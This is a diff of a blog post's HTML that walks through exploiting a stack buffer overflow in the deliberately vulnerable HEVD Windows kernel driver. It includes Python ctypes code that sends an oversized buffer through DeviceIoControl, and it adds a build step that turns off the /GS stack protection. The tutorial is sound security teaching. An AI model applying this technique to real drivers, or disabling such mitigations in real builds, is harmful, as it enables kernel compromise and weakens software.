+    &lt;li&gt;&lt;strong&gt;Create a buffer with &amp;gt;2,048 bytes of data &amp;lt;——&lt;/strong&gt;&lt;/li&gt;
+    &lt;li&gt;Trigger the vulnerable code&lt;/li&gt;
+  &lt;/ul&gt;
+&lt;/blockquote&gt;
+
 &lt;p&gt;This step turns out to be pretty straightforward in Python. Ctypes gives us the &lt;a href=&quot;https://docs.python.org/2/library/ctypes.html#ctypes.create_string_buffer&quot;&gt;create_string_buffer()&lt;/a&gt; function which suits our needs perfectly. We saw before that the vulnerable function is expecting a buffer of 2,048 bytes. It is safe to assume that we will not need too much more than that in order to overwrite RIP. With this in mind, I like to break out my buffer into recognizable units so I can see where certain variables are being overwritten. I’ll start with this buffer:&lt;/p&gt;
 
 &lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;n&quot;&gt;evilbuf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;create_string_buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2048&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;B&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;C&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;D&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
@@ -181,6 +847,15 @@ PAGE:FFFFF880037281F1           jmp     loc_FFFFF8800372831E
 &lt;p&gt;This should let us know where we stand when we trigger the bug and we can adjust as necessary.&lt;/p&gt;
 
 &lt;h4 id=&quot;step-four---trigger-the-bug&quot;&gt;Step four - trigger the bug&lt;/h4&gt;
+&lt;blockquote&gt;
+  &lt;ul&gt;
+    &lt;li&gt;Get a handle to the vulnerable device&lt;/li&gt;
+    &lt;li&gt;Get the correct IOCTL for the stack overflow function&lt;/li&gt;
+    &lt;li&gt;Create a buffer with &amp;gt;2,048 bytes of data&lt;/li&gt;
+    &lt;li&gt;&lt;strong&gt;Trigger the vulnerable code &amp;lt;——&lt;/strong&gt;&lt;/li&gt;
+  &lt;/ul&gt;
+&lt;/blockquote&gt;
+
 &lt;p&gt;As mentioned previously we now need to put everything together and use the &lt;a href=&quot;https://msdn.microsoft.com/en-us/library/windows/desktop/aa363216(v=vs.85).aspx&quot;&gt;DeviceIoControl function&lt;/a&gt; to trigger the bug. Again the MSDN page gives us the function prototype and explains all of the parameters necessary. We will give it the handle that we retrieved, the IOCTL that we generated, a pointer to our evil buffer as well as it’s size, and everything else is just null. My code looks like this:&lt;/p&gt;
 
 &lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;trigger&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hDevice&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dwIoControlCode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
@@ -188,13 +863,13 @@ PAGE:FFFFF880037281F1           jmp     loc_FFFFF8800372831E
 
     &lt;span class=&quot;n&quot;&gt;evilbuf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;create_string_buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2048&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;B&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;C&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;D&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
     &lt;span class=&quot;n&quot;&gt;lpInBuffer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;addressof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;evilbuf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;nInBufferSize&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;evilbuf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;nInBufferSize&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2064&lt;/span&gt;
     &lt;span class=&quot;n&quot;&gt;lpOutBuffer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;
     &lt;span class=&quot;n&quot;&gt;nOutBufferSize&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
     &lt;span class=&quot;n&quot;&gt;lpBytesReturned&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;
     &lt;span class=&quot;n&quot;&gt;lpOverlapped&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;
 
-    &lt;span class=&quot;n&quot;&gt;pwnd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;windll&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kernel32&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DeviceIoControl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hDevice&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;pwnd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DeviceIoControl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hDevice&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                                            &lt;span class=&quot;n&quot;&gt;dwIoControlCode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                                            &lt;span class=&quot;n&quot;&gt;lpInBuffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                                            &lt;span class=&quot;n&quot;&gt;nInBufferSize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
@@ -203,7 +878,7 @@ PAGE:FFFFF880037281F1           jmp     loc_FFFFF8800372831E
                                            &lt;span class=&quot;n&quot;&gt;lpBytesReturned&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                                            &lt;span class=&quot;n&quot;&gt;lpOverlapped&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
     &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pwnd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;[-]Error: Not pwnd :(&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FormatError&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[-]Error: Not pwnd :(&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FormatError&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
         &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 
 &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;__main__&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
@@ -337,7 +1012,7 @@ IMAGE_NAME:  HEVD-Win7x64.sys
 
 &lt;p&gt;&lt;img src=&quot;/images/hevd1-ss1.jpg&quot; alt=&quot;New Kernel Mode Driver&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;Right-click on the Header Files folder in the Solution Explorer on the right and click Add &amp;gt; Existing Item… Browse to the driver source code directory and import all the .h files. Do the same for the Source Files folder in Solution Explorer and import all the .c files. Now under the Project menu, select HEVD-win7x64 Properties… to open the project properties dialog. I had to change a few things in here to finally get it working correctly. Click the C/C++ node and change “Treat Warnings As Errors” to “No (/WX-)”. Click the Driver Settings node and make sure the Target OS is Windows 7 and Target Platform is Desktop. At this point you should be ready to build! Under the Build menu, click Build Solution and if all goes well you should find HEVD-Win7x64.sys under your project folder in x64\Release:&lt;/p&gt;
+&lt;p&gt;Right-click on the Header Files folder in the Solution Explorer on the right and click Add &amp;gt; Existing Item… Browse to the driver source code directory and import all the .h files. Do the same for the Source Files folder in Solution Explorer and import all the .c files. Now under the Project menu, select HEVD-win7x64 Properties… to open the project properties dialog. I had to change a few things in here to finally get it working correctly. Click the C/C++ node and change “Treat Warnings As Errors” to “No (/WX-)”. You’ll also want to scroll down to the Code Generation sub-node and change the Security Check option to “Disable Security Check (/GS-)” so we can play with this buffer overflow without complications. Click the Driver Settings node and make sure the Target OS is Windows 7 and Target Platform is Desktop. At this point you should be ready to build! Under the Build menu, click Build Solution and if all goes well you should find HEVD-Win7x64.sys under your project folder in x64\Release:&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;/images/hevd1-ss3.jpg&quot; alt=&quot;Driver Compiled&quot; /&gt;&lt;/p&gt;
 
